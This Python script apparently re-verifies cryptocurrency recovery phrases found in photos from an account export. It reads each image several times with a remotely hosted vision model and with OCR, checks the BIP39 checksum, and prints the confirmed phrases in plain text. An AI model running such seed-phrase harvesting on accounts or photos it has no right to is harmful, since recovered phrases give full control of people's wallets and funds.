#!/usr/bin/env python3
"""Re-check every phrase the vision model produced, four ways, before trusting it.

A single answer can be wrong.  For each photo that already has a checksum-valid
phrase this asks again:

    * 896 px, 1024 px, 1152 px with the plain "words only" prompt
    * 1024 px with a "number every word" prompt, which exposes a wrong reading
      order in a two-column layout
    * and it runs RapidOCR on the same image as an independent engine

A phrase is CONFIRMED only when all four model answers are identical and pass
the BIP39 checksum.  Anything else is listed as REVIEW with every variant, so a
human reads exactly those few photos.

    recheck_phrases.py --account x@y.com [--workers 8]
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import threading
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import classify_all as ca  # noqa: E402
from read_phrase import Transcriber, parse_phrase  # noqa: E402
from verify_seeds import fetch, source_for  # noqa: E402
from worker import scan  # noqa: E402

SIDES = (896, 1024, 1152)
NUMBERED = (
    "This image may show a crypto wallet recovery phrase of 12, 15, 18, 21 or 24 "
    "lowercase English words.\nList every word exactly as it appears, with its "
    "position number, one per line, like: 1. word\nNumbers only, no comments. "
    "If there is no recovery phrase, answer exactly: none"
)


def log(message: str) -> None:
    print(time.strftime("%H:%M:%S ") + message, flush=True)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--account", required=True)
    parser.add_argument("--workers", type=int, default=8)
    parser.add_argument("--ocr", default="1")
    parser.add_argument("--base-url", default=os.environ.get("VISION_BASE_URL",
                        "https://e1fbo6zesvurm4-8000.proxy.runpod.net/v1"))
    parser.add_argument("--model", default=os.environ.get("VISION_MODEL", "Qwen/Qwen3.5-4B"))
    args = parser.parse_args()

    accounts = ca.account_roots()
    root = accounts.get(args.account)
    if not root:
        parser.error(f"no export directory for {args.account}")
    source_file = ca.OUT_DIR / f"phrase-{args.account.split('@')[0]}.jsonl"
    if not source_file.is_file():
        parser.error(f"no phrases for {args.account}: {source_file}")
    hits = [json.loads(line) for line in source_file.read_text().splitlines() if line.strip()]
    hits = [row for row in hits if row.get("checksum")]
    if not hits:
        log("no checksum-valid phrase to re-check")
        return
    log(f"{len(hits)} phrases to re-check · 4 model reads + OCR each")

    stage = ca.STAGE / f"recheck-{args.account}"
    fetch(args.account, root, [row["rel"] for row in hits], stage)
    index = scan.word_index()
    transcriber = Transcriber(args.base_url, args.model, 1024)
    lock = threading.Lock()
    ocr_lock = threading.Lock()  # one RapidOCR instance, shared by workers
    results: list[dict] = []
    done = 0

    def read(path: Path, side: int, prompt: str) -> tuple[str, str]:
        transcriber.side = side
        outcome = transcriber.run("", path, prompt=prompt, max_tokens=160)
        if outcome.get("status") != "ok":
            return "", outcome.get("error", "error")
        windows = parse_phrase(outcome.get("raw", ""), index)
        if not windows:
            return "", "no-words"
        phrase, valid = windows[0]
        return " ".join(phrase), ("ok" if valid else "checksum-failed")

    def work(row: dict) -> None:
        nonlocal done
        rel = row["rel"]
        path = source_for(args.account, root, stage, rel)
        reads: list[dict] = []
        if path is None:
            reads.append({"side": 0, "prompt": "none", "phrase": "", "state": "missing"})
        else:
            for side in SIDES:
                phrase, state = read(path, side, PROMPT_PLAIN)
                reads.append({"side": side, "prompt": "words", "phrase": phrase, "state": state})
            phrase, state = read(path, 1024, NUMBERED)
            reads.append({"side": 1024, "prompt": "numbered", "phrase": phrase, "state": state})
        phrases = [item["phrase"] for item in reads if item["state"] == "ok" and item["phrase"]]
        votes = Counter(phrases)
        best, best_votes = (votes.most_common(1)[0] if votes else ("", 0))
        ocr_phrase = ""
        if args.ocr == "1" and path is not None:
            try:
                with ocr_lock:
                    text = scan.ocr_image(path)
                found = [item for item in scan.find_sequences(text, index)
                         if item["words"] in (12, 15, 18, 21, 24) and item["checksum"]]
                ocr_phrase = found[0]["phrase"] if found else ""
            except Exception:  # noqa: BLE001
                ocr_phrase = ""
        confirmed = best_votes == len(SIDES) + 1 and all(
            item["state"] == "ok" for item in reads)
        record = {
            "rel": rel,
            "label": row.get("label", ""),
            "phrase": best,
            "votes": f"{best_votes}/{len(SIDES) + 1}",
            "status": "confirmed" if confirmed else "review",
            "ocr": ocr_phrase,
            "ocrAgrees": bool(ocr_phrase) and ocr_phrase == best,
            "variants": sorted({item["phrase"] for item in reads if item["phrase"]}),
            "reads": reads,
        }
        with lock:
            results.append(record)
            done += 1
            log(f"{done}/{len(hits)} · confirmed "
                f"{sum(1 for item in results if item['status'] == 'confirmed')}")

    with ThreadPoolExecutor(max_workers=max(1, min(args.workers, len(hits)))) as pool:
        list(pool.map(work, hits))

    import shutil

    shutil.rmtree(stage, ignore_errors=True)
    results.sort(key=lambda item: item["rel"])
    out = ca.OUT_DIR / f"recheck-{args.account.split('@')[0]}.jsonl"
    out.write_text("\n".join(json.dumps(item) for item in results) + "\n")

    confirmed = [item for item in results if item["status"] == "confirmed"]
    log(f"confirmed {len(confirmed)}/{len(results)} · wrote {out}")
    for item in results:
        mark = "OK  " if item["status"] == "confirmed" else "REVIEW"
        agrees = "ocr=yes" if item["ocrAgrees"] else ("ocr=no" if item["ocr"] else "ocr=-")
        log(f"  {mark} {item['votes']} {agrees} {item['rel']}")
        log(f"        {item['phrase']}")
        if item["status"] != "confirmed":
            for variant in item["variants"]:
                log(f"        variant: {variant}")
            if item["ocr"] and not item["ocrAgrees"]:
                log(f"        ocr:     {item['ocr']}")


PROMPT_PLAIN = (
    "This image may show a crypto wallet recovery phrase: 12, 15, 18, 21 or 24 "
    "lowercase English words, usually numbered and often in two columns.\n"
    "Transcribe those words in reading order, space separated, one line, "
    "lowercase. Do not include numbers, punctuation or comments.\n"
    "If there is no recovery phrase, answer exactly: none"
)


if __name__ == "__main__":
    main()
